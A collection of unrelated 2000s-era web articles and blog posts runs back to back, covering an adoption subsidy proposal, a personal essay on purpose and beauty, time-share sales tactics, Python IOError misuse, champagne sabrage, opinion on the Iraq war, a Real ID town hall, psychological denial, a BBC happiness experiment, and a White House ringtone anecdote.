$ 500 not to have an abortion ?
A Texas State Senator has been ridiculed for his proposal to pay women $ 500 if they show up at an abortion clinic , elect not to have an abortion , and then give the baby up for adoption .
Honestly , though , is it really such a bad idea ?
What if he left out the part about visiting an abortion clinic ?
Does it make sense to subsidize women who were going to give up babies for adoption ?
I think maybe it does .
There are large numbers of parents who want to adopt , and a shortage of mothers willing to put healthy babies up for adoption .
There are laws restricting what prospective adoptive parents can pay the birth mother .
Providing a subsidy to birth mothers ( perhaps conditioned on testing negative for drugs and doing a full set of prenatal hospital visits ) sounds like a pretty sensible thing to do .
The part about visiting the abortion clinic is just a waste of time .
Any woman who knew she was going to give her child up for adoption would have an incentive to make an appearance at the abortion clinic just to qualify under this guy ’s law .
So why not just scrap that part of it and debate whether we should be subsidizing women who give their babies up for adoption .
I find it amusing that one of the criticisms of the proposed law is as follows :
Heather Paffe , political director of Planned Parenthood of Texas , said Patrick ’s proposal “ is very cynical and insulting to women and their families . ”
“ It ’s insulting to think women would make that kind of decision so easily , ” she said .
It sounds to me like the crux of Heather Paffe ’s argument is that $ 500 just is n’t a high enough price !
In 1997 I was in graduate school , and I was coming to that dreaded point where you have to decide on a dissertation topic .
I enjoyed linguistics , and there were dozens of topics I could have chosen ; but whenever I asked myself , “ Is THIS what I want to study the rest of my life ? ” , I had a sinking feeling that I was a terrible fraud , and that I was in the wrong place entirely .
I did n’t know what I should be doing , but graduate school just did n’t seem right anymore .
What should I be doing ?
What was the purpose of my schooling ?
What was the purpose of my life ?
Dolly Sods
Partly to get away from school for a few days and think about things , I went on a camping trip with some of the other graduate students to the Dolly Sods Wilderness in West Virginia .
It was a rainy , wet weekend , and we hiked over miles of muddy mountains , losing ourselves among the mountain laurel , rhododendrons , and the high meadows .
It was utterly beautiful .
I pushed myself way too hard physically — my friends were in better physical condition than I was — and there was probably something not quite right about the water in our campsite .
As we piled into our cars to go home , I was exhausted , sopping wet , and — halfway down the mountain — throwing up .
Regardless of my physical condition , though , I simply could not bear to go back to school without figuring something out .
So I told my friends to go on back without me , because I was going to find a nice little state park somewhere and camp another couple of days by myself .
They were a little worried about me , but they agreed and left me to my own devices .
I was halfway back to Washington , DC , peering through the windshield at a nasty , spattering rain , shivering with cold in the middle of June .
Suddenly I said to myself , “ I ’m done with this .
I ’m going somewhere DRY . ”
It was a stupid , petty goal , but it was a goal .
Somewhere Dry
It was late evening by this time .
I found a hotel in Northern Virginia and stayed the night .
The next morning I got out the door around 10 a.m. , feeling much better , and headed south down I - 81 .
Somewhere in southern Virginia , in the early afternoon , the clouds burst into pieces and scattered like white sheep to the four winds , and the sky was like a deep crystalline lake hanging above me .
It was so beautiful … I knew I was headed the right direction .
In western Tennessee , I hit I - 40 and turned west .
In Nashville , I found my engine was overheating , and I stopped to find out what was wrong .
It turned out my radiator cap had fallen off .
I bought a new one and kept on going .
Night fell a couple hours from Memphis .
The bridge over the Mississippi was a stunning string of pearls strung across the hot black velvet night .
At midnight I came to the first rest stop in Arkansas , and stopped there to sleep .
Dawn woke me up at 6 a.m. , and I continued west .
Arkansas was amazingly flat after the rolling green hills of Tennessee and Virginia .
The vast expanse of open country seemed to pry my heart open , too .
The sun was shining , and the air was hazy with the moisture rising off the rice fields .
Lovely … but not dry enough .
At Little Rock I turned south .
I knew there was desert in Texas , and I was determined to get to it .
I had a single cassette tape of bluegrass music , and I played it over and over until I was sick of it , and then sang songs at the top of my voice to keep myself awake .
I laughed for twenty miles straight after I shot through the little town called Hope and saw a huge billboard of their native son , Bill Clinton .
Father Sun was high overhead and baking the mists out of the ground when I went through Texarkana .
Slowly , slowly , the miles crawled past and the air grew hotter and dryer .
I took deep breaths of it — it was fantastic .
South of Dallas , I left the interstate and followed the smaller roads into the Texas Hill Country .
The hills are n’t technically desert , but they ’re dry and rocky and lovely .
I felt like I was coming into the sun ’s own lands , like Odysseus visiting the island of the sun ’s sacred cattle .
Land of the Sun
Somewhere southwest of San Antonio , I stopped by the side of the road .
The sun was setting , and I knew I had to turn around if I was going to make it back to class on Tuesday .
I pulled over at the crest of a hill , and sat on the hood to watch the sun go down between the hills on the western horizon .
Heat rose out of the dusty rocks around me , and the cottonwoods swayed in the hot breeze .
The only sound was the quiet tink , tink , tink of my car ’s oil as the engine cooled .
A tiny lizard darted between the stones .
The sky was almost pure blank white .
Everything was so beautiful .
On the drive down , I had n’t done anything but focus on the road and the countryside going past .
Now my mind went back to the great questions :
What is my purpose ?
What is my direction ?
What am I really trying to achieve in school ?
What about my life ?
What do I want to achieve with THAT ?
What would it mean to have a successful life ?
I was brought up in a Zen Buddhist household , in which “ success ” was defined as “ realizing that success and failure are both parts of the illusion of the world ” .
When I told my Mom I wanted to go to college , she said , “ Why ?
Are you sure that ’s a good idea ? ” I ’m not kidding .
I answered her well enough at the time , but now I realized I had no good answer to her question .
The oil stopped dripping .
The lands around were silent , utterly empty of noise , and it was easy to let my thoughts fall silent as well .
I was struck again by how beautiful it all was .
How about the universe itself ?
I thought .
What is ITS purpose ?
What is ITS direction ?
Is it trying to “ achieve ” something ?
No answer came , except the white hot silent loveliness everywhere surrounding me .
At that moment , I was struck with a thought ; and as soon as I thought it , I was absolutely certain it was true .
There was no doubt in my mind then , and all these years later , there ’s still no doubt .
Beauty is the Purpose
The grand purpose of the universe is beauty .
Beauty itself is its purpose .
Like a great work of art , it needs no other purpose , no other reason for being .
It is far and away enough .
I have no logical arguments or scientific evidence for this .
I even know some arguments against it .
But I know it ’s true , for a certainty , like a pearl in my heart .
And if THAT is the purpose of the universe … then what higher purpose could I set for my own life ?
What could be better than to live a life dedicated to creating beauty — and living beautifully ( if I could figure out what that would be ) ?
So I drove back , singing along with the hills .
I decided I would write the most beautiful dissertation I could — I would make it elegant , surprising , and true .
( Footnote : I still have n’t written it , but I finally managed to get its outline down in 2005 . )
And that fall , my biggest goal ( outside of school ) was to buy a big fuzzy sweater , go hiking a lot , and enjoy the autumn foliage as I never had before .
Maybe I would even take up pipe smoking …
As it turned out , when school started again I met my first wife ; and a year later , I was married , and the father of a girl more lovely than anyone or anything I had ever seen .
A Successful Life
Now , I ’m not going to try to convince you that I ’m right about the purpose of the universe .
I do n’t think I could do that — certainly not with logical argument , anyway .
But imagine for a moment that I ’m right .
Given that universal purpose , what does it mean to be successful in life ?
Success is :
Enjoying beauty ; but even more :
Creating beauty , and
Living beautifully .
In 2006 , shortly before starting this blog , I drew up a list of goals for my life — specific ways of achieving those three aspects of success .
Here it is , in no particular order , just to give you an idea of what my idea of a beautiful life for myself would be :
Physical fitness
Sexual and emotional expression
Living a simple , uncluttered life
Making discoveries ( in science or other fields ) to benefit all
Helping broaden the conscious creative powers of all
Seeing my children leading happy lives
Caring for my parents according to their wishes
Being in nature every day
Travelling at least twice a year
Living courageously
Living truthfully
Living peacefully
Tithing
Creating a yearly work of great beauty
Making music
Making someone laugh daily
These are big lifetime goals , obviously .
While some of them probably look pretty vague , I ’ve actually got concrete plans attached to each .
For example , to “ Help Broaden the Conscious Creative Powers of All ” , I intend to continue to support and promote Waldorf education .
Daily Successes
But what kinds of things can you do daily to promote beauty ?
Speaking for myself , I try to work on these every day :
Being a parent — literally or figuratively .
Fatherhood .
Children are beautiful things , in so many ways .
Everything I do for them fosters their beauty , and by doing my duty by them and giving of myself , I am increasing the beauty inherent in my own life — I am living more beautifully .
If you are not a parent yourself , then consider your creative projects your children .
Creative projects .
Whenever I set out to create something , I try to consider its form as well as its function .
And I try to remember that elegance and efficiency in function is beautiful , but that ’s not the only kind of beauty .
Loving relationships .
Any relationship between individuals enriches and adorns both souls .
Any relationship between individuals enriches and adorns both souls .
Enjoy life .
Here , I mean “ enjoy ” as in creating joy .
A life of struggle can be noble and beautiful in its own way , but beauty is something that excites awe and rapture .
Here , I mean “ enjoy ” as in creating joy .
A life of struggle can be noble and beautiful in its own way , but beauty is something that excites awe and rapture .
Flexibility .
I remember the ancient Taoist saying : Man at his birth is supple and weak ; at his death , firm and strong .
So it is with all things .
Trees and plants , in their early growth , are soft and fragile ; at their death , dry and withered .
Thus it is that firmness and strength are the followers of death ; softness and weakness , the followers of life .
Remain as flexible as a blade of grass , and dance with the wind .
WHAT Secrets of Success ?
In 2007 I was given a blog tag by two people at once : what are your secrets of success ?
The idea was that a bunch of bloggers would list their secrets , and they ’d all be gathered together in one place when the tag had played itself out .
Then anyone who wanted to be EXTREMELY SUCCESSFUL could just bop on over to that site and have so much great advice in one spot that their heads would explode .
I ’d previously been tagged with “ Why Do You Blog “ , and I thought this tag would be a piece of cake compared to that one .
But once I got to thinking about it , I started to get worried .
Because of my upbringing , I grew up with no “ default ” idea of what success is .
I mean , I certainly set goals , and sometimes I achieved them , and that was “ success ” for that goal .
But what did success MEAN outside the context of a particular goal ?
I realized , as I started working on this post , that I had some thinking to do .
Eventually , after tearing and teasing my hair out for a week , I had to go back to first principles .
By most people ’s standards , I ’m a reasonably “ successful ” person .
I have a loving family and a good job , not too stressful , with an income well above the national average .
But I ’m not chasing the dream of material success , societal status , or even “ enlightenment ” or “ union with the eternal ” .
I try to see my life , and the lives of others , as a work of art .
I am at once the artist and the work itself .
In such an endeavor , the word “ successful ” can barely even be applied .

( Budget Travel Online ) --
The slick , fast - talking time - share salesman still exists .
He may no longer wear a lime - green leisure suit , but he 's solely focused on the sale -- and he 's largely the reason the industry has a less - than - stellar reputation .
Some salespeople talk , talk and talk , and never listen to the client .
There 's no shortage of unseemly tactics , with questions like " Do n't you think your children deserve better ? "
I 've seen a salesperson give a tour of one time - share and then at the last minute try to sell a property in another part of the country .
To avoid falling for a trick , pay close attention and never let a salesperson tell you what you want .
A scripted pitch
Although time - shares each have their own phrases , and salespeople have leeway to improvise , there are certain steps all staffers are trained to follow .
The script begins with a Greeting ; moves on to the Intent , in which a client hears what 's going to happen during the presentation ; and then gets to the Warm - up , which is basically small talk .
At some point , the salesperson will steer the conversation to the Product , with an introduction to terms such as " fixed week " and " floating week , " before proposing a Vacation Problem Solution in the form of a time - share purchase .
Depending on the salesperson , the steps might feel like natural conversation or an extremely awkward blind date .
The puke price
Asking the client to buy is the final step .
The salesperson will show a price sheet , often with a figure known as the " puke price " because it 's so high , it 'll make a client feel sick .
Shortly afterward , a sales manager -- whom insiders call a T.O. , as in Take Over -- will come in and say something about how that 's the price for anyone who just walked in off the street .
The T.O. may then say , " I 'm not supposed to show you this . . . " or " We have a special inventory that 's going to sell fast . . . " and offer a much cheaper price -- what we call the Nosebleed Drop .
Personally , I hate the whole game .
It 's a crock .
If you want to avoid the gimmicks , insist up front that salespeople show you one price only .
If they do n't deliver on this , walk away .
Fuzzy math
I remember how one salesperson used to describe hotel price inflation to an unsuspecting client .
" If you pay $ 100 for a typical hotel room today , " he 'd say , " and figure an annual inflation rate of 10 percent , that means that in 10 years , that same hotel room will cost you $ 1,000 ! "
Actually , even if such inflation occurred , the amount would be $ 260 in 10 years .
Be doubly sure to check the numbers when it comes to financing and monthly payments .
In fact , avoid the developer 's financing , which is typically a rip - off .
You 're better off finding financing on your own .
No means no
I sincerely believe that for the right people , buying a time - share is a legitimate alternative to paying for hotels year in , year out .
But if you 're really not interested in investing in a time - share , do n't waste your time at a presentation .
In my opinion , the discount you receive on lodging and entertainment is not worth the few hours of vacation you 're giving up to hear the sales pitch that goes along with the deal .
That said , if you 're curious enough to listen to the pitch and decide a time - share is n't for you , just tell the salesperson so as firmly and plainly as possible .
But salespeople do n't give up easily :
You may have to repeat yourself a half - dozen times before the message gets through .

From Lawrence Oluyede 's blog entry about recent Python SVN updates :
urllib raises IOError if the servers response contains an invalid HTTP status line .
Augh .
Wait , that 's not strong enough , let me try again : AUGH .
In fact , it gets worse .
To quote from the urrlib2 SVN source code 's comment about its URLError error class :
URLError is a sub - type of IOError , but it does n't share any of the implementation . [...]
( urllib2 also directly raises mis-formatted IOError exceptions for some things . )
Python 's IOError and OSError have a very specific purpose ; they report low level operating system errors .
That is the only thing they should be used for , most especially if you are not going to carefully mimic the existing exception object format ( which you can't do , because you do n't have a real errno value ) .
Having an alleged IOError object that looks nothing like real IOError objects is actively offensive , especially when it is in the standard library .
What these people have done , whether they realize it or not , is to turn IOError exception objects into nothing more than strings , because these modules have insured that there is no higher structure that you can count on an IOError instance having .
Unfortunately the relevant Python documentation does not mention this , and continues to mislead the innocent into believing that when they catch an IOError exception they can do useful things like look at its errno or strerror attribute .
Or , to boil it down : never raise or subclass IOError , OSError , or EnvironmentError .
( This applies to EnvironmentError as a whole because using it in an except clause is the common way to catch both IOError and OSError at once . )
The only exception is if you are somehow directly calling a C library function ( that is documented as setting errno on failures , which not everything does ) , in which case you should do the research to exactly mimic how the Python core code does it .
To my horror , urllib2 is hardly the only offender ; there are even some in C level modules ( in bz2 module.c and zipimport .c ) .
But that does n't excuse them making the situation worse ; in fact they should be moving towards making the situation better .
Even with backwards compatibility concerns they could have raised URLError instead of IOError directly ( or taken the opportunity to introduce a proper error class if they felt URLError was inapplicable ) .
( This rant has been brought to you by my attempt to catch up on Planet Python . )
Last night , a few of us went out to Bubble Lounge for some champagne , music , and …yeah , mostly just champagne .
We knew it would be a good night , but it turned out to be a great night after we saw the historian of the group whispering to our server with a glint in his eye .
We did n’t think much of it until our server brought our second bottle of champagne , upside down in a bucket of ice , and whipped out a small sword .
It was a sabre , which he proceeded to use to chop off the neck of the champagne bottle , with a flourish , and pour new glasses for us .
Whoa .
I ’d heard about sabrage before , but I ’d never had the chance to witness it in person .
Evidently , it started with Napoleon ’s cavalry in the 18th century .
The night before they were to fight , officers would serve champagne to their infantry in a French take on the “ last meal . ”
Madame Clicquot herself is rumored to have started the tradition .
Whether or not that ’s true , it was a great show .
Our server described the science and technique behind it , showed us the seam in the glass , and demonstrated proper technique – in a nutshell , slide , do n’t chop .
Still , when the sabre finally hit the bottle and the glass exploded , I was blown away .
He was quick , clean , and absolutely effortless .
What ’s more , we kept the cork , with the remnants of the glass neck still hugging it all the way around .
Very , very cool .
Thanks to Dan for the inspiration , along with the picture and original post .

The standard right - wing myth when it comes to Vietnam is that “ the politicians ” sold out the military and lost a war that could have been won .
Civilian interference with the strategy and tactics employed by military professionals led to U.S withdrawal from Vietnam , which was not a defeat so much as a victory aborted by subversives on the home front .
Or so the story goes .
While this idea is refuted by the facts  it was n’t for nothing that military experts of the time warned against getting involved in a war on the Asian landmass  at least it represents an attempt to make a rational argument , which is that the conduct of a war is best left to the professionals .
In our post - 9/11 Bizarro World reality , however , that stance has been completely inverted .
Instead of abhorring civilian interference in the military , the neocons are emphatically in favor of it .
They emphasized from the very beginning of the Iraq debate that the civilians knew best , and that the generals  by casting doubts on the White House ’s rosy scenario  were interfering with policymaking decisions .
When senior military figures , both active and retired , began to voice reservations about the wisdom of invading and occupying Iraq , the neocons raised a hue and cry about the need to maintain civilian control of the military .
How dare these generals meddle in politics !
Get them back to their barracks and out of the public square !
One of their number even wrote an entire book making the case for presidential direction of wartime military strategy , citing as models the neocon holy trinity : Abraham Lincoln , Franklin Roosevelt , and Winston Churchill .
President Bush read the book over his 2002 summer vacation , and from all indications he has taken it to heart .
In spite of what the Washington Post describes as the “ unanimous ” opinion of the joint chiefs of staff , Bush is determined to inject a “ surge ” of troops into Iraq to stabilize  and perhaps save  what the Baker - Hamilton report [ . pdf ] characterized as a “ grave and deteriorating ” situation :
“ The Bush administration is split over the idea of a surge in troops to Iraq , with White House officials aggressively promoting the concept over the unanimous disagreement of the Joint Chiefs of Staff , according to U.S. officials familiar with the intense debate . ”
When our president looks in the mirror , whom does he see ?
Lincoln ?
FDR ?
Churchill ?
Napoleon is more like it .
Our expedition to Iraq bears a striking resemblance to the Little Corporal ‘s march on Russia  or , perhaps , Hitler ’s version of the same mistake .
Both were calamitous for the invaders , bringing to mind newly sworn - in Defense Secretary Robert Gates ’ testimony in front of a Senate committee :
“ As the president has made clear , we simply cannot afford to fail in the Middle East .
Failure in Iraq at this juncture would be a calamity that would haunt our nation , impair our credibility , and endanger Americans for decades to come . ”
However one defines it , our mission in Iraq is already a clear failure : the question is , will we let this calamity morph into a cataclysm of regional and even global scope , or will we succeed in isolating and containing the disaster ?
There are degrees of calamity , and the one about to be inflicted on us by our Napoleon in the White House is worse than it has to be .
There is no way to avoid the consequences of having invaded Iraq in the first place : the breakup of the Iraqi state , the rising influence of Iran , the civil war and horrific loss of life .
There is , however , an opportunity to minimize our losses and those of the long - suffering Iraqi people , and that is by minimizing our troop presence rather than increasing it .
However , when it comes to our deluded leaders , who see themselves as world - historical figures , no price is too high to pay for their legacy as conquering heroes .
They will see their vision of the world confirmed even if it leads to our utter ruination .
If the military is breaking , the people are rebelling , and the country is sliding into bankruptcy , then that ’s a small price to pay for fulfilling our role as the supreme arbiter of world affairs  is n’t it ?
The direr the consequences , the more the neocons see their own struggle as a heroic endeavor undertaken against overwhelming odds .
In the end , it is n’t about American interests , or the future of the Middle East  it ’s all about them , and their rotten place in history .
Next to these grandiose pretensions , however , the everyday reality of our policy on the ground in Iraq underscores the sheer corruption at the heart of our mission .
A perfect example : the other day an Iranian - American , Ayham Samarrai  a former minister of electricity charged with absconding with $ 1.5 billion in Iraqi government funds  was broken out of an Iraqi jail :
“ According to Judge Radhi Radhi , Iraq ’s top anticorruption official , two GMC vehicles belonging to an American security company arrived at the Samarrai ’s jailhouse Sunday afternoon , intimidated the police officers guarding the site and took the suspect away without firing a shot . ”
Whatever tawdry corruption underlies this incident  and who knows what kind of cover - up is being attempted in this case ?
 it underscores the harsh reality of Iraq ’s ongoing slide into Hobbesian anarchy .
The lawlessness that has overcome Iraq and its fledgling government has its source not in the insurgency  which is limited to the Sunni Triangle  and not in the Shi’ite militias ( which do keep a kind of order , albeit a bloodstained , sectarian one )  but in the Americans , who run the country as if it were a conquered province .
Too bad for them it does n’t want to stay conquered
Make no mistake about it : a “ surge ” in troop numbers and a correspondingly more aggressive stance will only exacerbate the crisis and increase the force of the “ blowback ” effect .
There is only one rational way forward , and that is to put this disaster behind us .
The U.S. must begin an orderly yet rapid retreat from an increasingly untenable position .
We are fast approaching a “ Saigon moment , ” when a spectacular display of our vulnerability  like the 1983 destruction of the Beirut barracks , in which 241 Marines were killed by a suicide bomber  signals the utter futility of continuing this wrongheaded war .
The so - called Green Zone sits smack dab in the middle of war - torn Baghdad as a symbol of America ’s ostensible invincibility and undoubted imperial arrogance : can a more inviting target be imagined ?
Before some singular disaster further erodes America ’s prestige around the world , and our looming defeat becomes an undeniable reality , let ’s get out while the getting is good .
DAVIS , California – Department of Homeland Security officials got an earful Tuesday during a webcast town - hall - style meeting on the controversial Real ID initiative – a federal government plan to standardize state - issued ID cards and link identification databases nationwide .
States and civil liberties groups have been bristling at the requirements of the Real ID Act , which would require states , starting in 2008 , to revalidate citizens ' birth certificates , store copies of the documents , and interconnect their databases to prevent duplicate licenses .
Current holders of driver 's licenses would have to return to their state motor vehicle departments with certified source documents to re-up their licenses as part of the proposed upgrade , which DHS estimates will cost states and citizens $ 20 billion .
DHS Assistant Secretary Richard Barth , along with other federal officials sitting on the stage in Freeborn Hall at the University of California at Davis , heard personally from transgender activists , anti-domestic - violence workers and ordinary citizens worried about Real ID 's privacy impact , and the burden of increased bureaucracy .
John Pinfield , an attorney for California 's tax authority , said he took the day off work at the last minute to come register his concerns , which he said cost him $ 500 and some finagling with his boss .
" You say this is not a national ID card , but it looks like a national ID card to me and looks like a road to a national ID card that is undercover , " Pinfield said .
" There are people with a lot less money than I have and they will have to make excuses and pleas to get documents and get things done . "
The proceeding was briefly interrupted for five minutes when about 50 immigrants - rights protesters stood at the back of the auditorium , clapping and chanting , " Real ID , Real ID , sounds like a racist thing to me . "
The protesters left , but returned an hour later outside the auditorium with a hundred more chanting supporters .
The rules would prohibit states from allowing undocumented aliens from acquiring a Real ID - approved license .
For its part , DHS made its case with little subtlety .
" A fraudulent ID card in the hands of a terrorist is a weapon , " said Barth , sitting under a projection of 9/11 terrorist Mohamed Atta 's Florida driver 's license .
Barth signaled that DHS was still open to changing the rules based on comments , but he seemed exasperated with the criticism .
" We are trying to make sure no state is the weakest link in letting people do things they should n't do , whether that is boarding an airplane , or any other activity we want to prevent , " he said .
" This is not a national ID card . "
The sparsely attended meeting , which was the only public forum on Real ID planned by DHS , was announced only eight days ago .
Members of the Coalition for a Secure Driver 's License , an advocacy group founded after 9/11 , provided almost all of the citizen support for the rules .
" We live in the 21st century in a time of terrorism , " said Neil Berro , the group 's executive director .
" The driver 's license is our linchpin identification and has been for decades . "
Lenny Goldberg , who has lobbied for the California - based Privacy Rights Clearinghouse , countered that state motor vehicle departments are in no condition to be part of the national security apparatus .
" We used to have huge long lines at the DMV and we then went to simplified processes with online and mail applications , " Goldberg said .
" If we hated the DMV then , we will hate it again in the future .
Many of us are going to have to go back three times . "
State legislatures have been bristling at the requirements of the Real ID Act , which would force states to comply with the regulations or face having their citizens unable to enter an airport security line , or any federal building or courthouse , with their state - issued identification .
Maine and Montana have passed laws banning the states from complying with the rules , decrying them as damaging to privacy and impinging upon states ' rights .
Also in this week 's column :
Why are people so often in denial ?
Asked by Ron James of Manchester , UK
In the psychological sense , denial is a defense mechanism in which a person , faced with a painful fact , rejects the reality of that fact .
They will insist that the fact is not true despite what may be overwhelming and irrefutable evidence .
There are three forms of denial .
Simple denial is when the painful fact is denied altogether .
Minimisational denial is when the painful fact is admitted but its seriousness is downplayed .
Transference denial is when the painful fact is admitted , the seriousness also admitted , but one 's moral responsibility in the situation involving the painful fact is downplayed .
When a person is in denial , they engage in distractive or escapist strategies to reduce stress and help them cope .
The effect upon psychological well - being in doing this is unclear .
The concept of denial was formulated by Sigmund Freud ( 1856 -1939 ) and greatly elaborated upon by his daughter , Anna Freud ( 1895 - 1982 ) , in the second volume ( 1936 ) of her eight volume Writings of Anna Freud .
The concept has been around for many decades .
Denial is an important factor in public health .
The American Heart Association cites denial as a principal reason why treatment for heart disease is often delayed .
The same is true for cancer .
Drs MS Vos and JC de Haes from the Department of Psychiatry at the Bronovo Hospital in The Hague , The Netherlands , recently point out that , based upon their study of cancer patients published in Psychooncology in July 2006 , up to 47 per cent of patients deny the fact that they have been diagnosed with cancer , up to 70 per cent deny the impact of the diagnosis upon their lives , and up to 42 per cent deny that it has any effect upon their feelings .
They add : " From a psychoanalytical viewpoint , denial is a pathological , ineffective defense mechanism ..
On the other hand , according to the stress and coping model , denial can be seen as an adaptive strategy to protect against overwhelming events and feelings . "
Therein is the appeal of denial to humans .
Denial allows someone to keep going unchanged despite reality .
Denial is the path of psychological and moral least resistance .
Five years after the 9/11 attack on New York and Washington DC , 40 per cent of New Yorkers are still to varying degrees " fearful " , " traumatised " or otherwise " unable to face reality " , according to NY public mental health experts .
In such a psychological state , people are not at their reasoning best - easily confused , manipulated , and fooled .
While in denial about global warming , people do n’t have to think about anything , inform themselves , change their consumption patterns , becoming actively involved in reforms , or alter their behaviour in any way .
Politicians with transference denial can absolve themselves of any moral imperative to take the necessary policy initiatives that that scientists say are mandatory for our species to survive .

Fictional Slough character David Brent in BBC's
The Office enjoys a good laugh
In an unusual three - month experiment , six specialists from a variety of disciplines worked to improve the happiness levels of a typical UK town .
The experts tried and tested 10 simple measures in the quest for happiness .
They found successful strategies included nurturing a plant , smiling at strangers and cutting television viewing by a half .
A four - part observational documentary series , Making Slough Happy , beginning on BBC Two on Tuesday , follows the team and their progress .
We will begin to change the psychological climate of Slough
Dr Richard Stevens , one of the happiness experts
The happiness team includes psychologist Dr Richard Stevens , psychotherapist Brett Kahr , work place specialists Jessica Pryce - Jones and Philippa Chapman , social entrepreneur Andrew Mawson OBE and Richard Reeves , whose expertise spans philosophy , public policy and economics .
During the series , they take 50 volunteers from Slough , with the aim of planting the " seeds of happiness " amongst this core group who will then spread their cheer to others in a ripple effect .
The 10 steps to happiness Plant something and nurture it Count your blessings - at least five - at the end of each day Take time to talk - have an hour - long conversation with a loved one each week Phone a friend whom you have not spoken to for a while and arrange to meet up Give yourself a treat every day and take the time to really enjoy it Have a good laugh at least once a day Get physical - exercise for half an hour three times a week Smile at and / or say hello to a stranger at least once each day Cut your TV viewing by half Spread some kindness - do a good turn for someone every day
Dr Stevens explained : " The volunteers will take their newfound skills and attitudes out into the community , and in this way we will begin to change the psychological climate of Slough . "
Based on best knowledge and research , the team came up with a 10 - point plan for happiness .
The experts measured the happiness levels of the Slough volunteers before , during and after the end of the project to assess if their methods were effective .
Throughout their experiment , the expert team face the challenge of selling their science to a potentially sceptical public , unprepared for their unconventional approach - from dancing in a supermarket aisle , to a spot of graveyard therapy and tree hugging .
Making Slough Happy is broadcast on Tuesdays at 9 pm on BBC Two , starting 15 November , 2005 .

 first published in the San Francisco Chronicle
Jim Lehrer : " Why have you not , as president of the United States , asked more Americans and more American interests to sacrifice something ?
The people who are now sacrificing are , you know , the volunteer military -- the Army and the U.S. Marines and their families .
They 're the only people who are actually sacrificing anything at this point . "
President Bush : " Well , you know , I think a lot of people are in this fight .
I mean , they sacrifice peace of mind when they see the terrible images of violence on TV every night .
I mean , we 've got a fantastic economy here in the United States , but yet , when you think about the psychology of the country , it is somewhat down because of this war . "
-- The Newshour , Jan. 16
So , President Bush is mindful of the suffering of those of us back home who " sacrifice peace of mind " because of his war in Iraq .
But if the war in Iraq bums you out , then imagine how bummed out you would be if you were Tim Kahlor , the father of Sgt. Ryan Kahlor , a 23 - year - old kid who has spent more than two years in that Bush - benighted nation .
Kahlor is still on active duty in Germany , and though he has survived four direct assaults on tanks he'd been riding in , and come through a number of other close calls , it 's still possible he 'll be sent back to Iraq in August .
Kahlor did n't come through those four attacks unscathed .
He 's suffered traumatic brain injury and compressed vertebrae in his back .
Those injuries have not been deemed serious enough to exclude him from the prospect of yet another tour of duty .
" Those four attacks he was in were just the ones in 2006 , " his father says .
" I do n't know the half of it , because he does n't tell me everything , and you never can get much out of the Army .
They diagnose the injuries , and then your status rides on how that diagnosis got made .
From what I understand about Vietnam , if you got wounded , you got sent home , but it 's not like that now . "
To say that his father worries about his son is a tremendous understatement .
Tim Kahlor compares his daily dread to a never - ending prom night , when your kid is out driving for the first time and you 're waiting by the phone at 3 a.m .
In Tim Kahlor 's world , and in the world of all those military parents who wait by their phones , it 's always 3 a.m. on prom night .
" All that time my son was in Iraq , " he says , " I 'd hear something on the news about soldiers killed in Iraq , and I 'd wonder if it 's my son .
At home , when a car came down our street , I always feared it might be someone coming to tell me that my kid was dead . "
Tim Kahlor is a member of a group called Military Families Speak Out , a national organization of more than 3,000 military families who have , or have had , relatives serving in Iraq .
I first met him outside the state Democratic convention in San Diego several weekends ago .
A 49 - year - old personnel payroll coordinator for San Diego State University , Kahlor hardly fits the image of a wild - eyed radical .
But he 's been jostled and insulted at a protest in Washington , and his patriotism has been called into question by people who , it always turns out , have no one serving in Iraq .
The sign he carries outside the convention hall urges Democrats to end funding for the war , and to get the troops home ASAP .
He is grateful when people stop to talk with him , and eager to speak to anyone who will lend an ear , but the press credentials hanging around my neck make me an especially welcome audience .
Kahlor has been talking to Democrats for the better part of two days , but his energy has not flagged .
Across the street from the convention center , a couple hundred anti-war demonstrators are waving banners and shouting slogans calling for the impeachment of Bush and Vice President Dick Cheney .
Their shouts , and the honking of the horns of motorists supporting their sentiments , serve as a chorus to the dialogue we are having .
Although he has told his son's tale to many , the emotions are still raw .
His voice catches and tears well up in his eyes when he utters the phrase " traumatic brain injury . "
" I look at my son , " Kahlor says , " and he 's all banged up , but there are so many who have suffered so much more than my son has .
We 've got to quit returning the same soldiers and Marines over and over . "
He brushes away a tear .
" I 'm still amazed Ryan has survived .
You can only run across the freeway so many times without getting hit . "
That evening , my wife and I attend a dinner for Nancy Pelosi .
When we return to the convention center for that event , Kahlor is still out front with a handful of other members of Military Families Speak Out .
We exchange greetings , and then my wife and I head in for the gathering of delegates , probably 1,000 people who've paid $ 125 a plate to hear tributes to the nation 's first woman speaker of the House -- who also happens to be the first Italian American and the first Californian to hold that post .
So there is a palpable sense of pride in that vast dining hall , along with the kind of anticipation that always comes with the prospect of seeing someone famous and important .
When Pelosi takes her place at the podium , a commotion breaks out at the far entrance to the dining hall .
I can't see what is going on , but I hear someone shouting , " Out of Iraq now . "
A ripple of apprehension runs through the hall .
These are uneasy times , and fear of madmen is never far away , so I am irritated by this method of expression , even as I share the frustration that prompted it .
Later , I learn that it was Kahlor and a couple other members of Military Families Speak
Out who were acting out the name of their organization .
No one was arrested .
They were hustled away by police , and Pelosi 's speech went on without further interruption .
In retrospect , I 'm a little ashamed of the annoyance I felt when Kahlor 's little protest sullied the good vibrations at that Democratic dinner , and I wish Pelosi had gotten to know the man I met outside the convention hall .
If she had , she might have called him to the podium , and reminded the people there of the reasons she is fighting so hard to end the war .
Then we might have seen the human face of real sacrifice , and known second - hand the cost so few of us have been asked to bear .

Play that funky music , ABC lady Posted by Mark Silva at 2:30 pm CST
This could be the first time that the oh - so - funky one - hit wonder from the Seventies , Wild Cherry , was invoked from the podium of the White House press briefing room , with press secretary Tony Snow 's cheerful : " Play that funky music , white girl . ''
Even better :
It was the errant , custom - tuned cell phone of ABC News chief White House correspondent Martha Raddatz which prompted this soulful outbreak in today 's press briefing .
Play that funky music , Martha .
ABC
News photo .
In the midst of Snow 's rather serious briefing about the speech that the president will give about the war in Iraq tomorrow , Raddatz 's phone rang in the front row .
It was n't chiming with bells or beeps , however .
It was ringing with a downloaded refrain from " Ridin ' ' ' -- a hip - hop number about " ridin ' dirty ' by Chamillionaire , featuring Krayzie Bone .
Snow , feigning a measure of shock , paused and asked : " Does Martha have a hip - hop ring tone ? ''
Then the press secretary let loose with an improvisation of his own , mercifully spoken , not sung : " Play that funky music , white girl . '''
This would be only a slight variation on Wild Cherry 's platinum hit from 1976 : " Yeah , they were dancin ' and singin ' and movin ' to the groovin ' ...
And just when it hit me somebody turned around and shouted ....
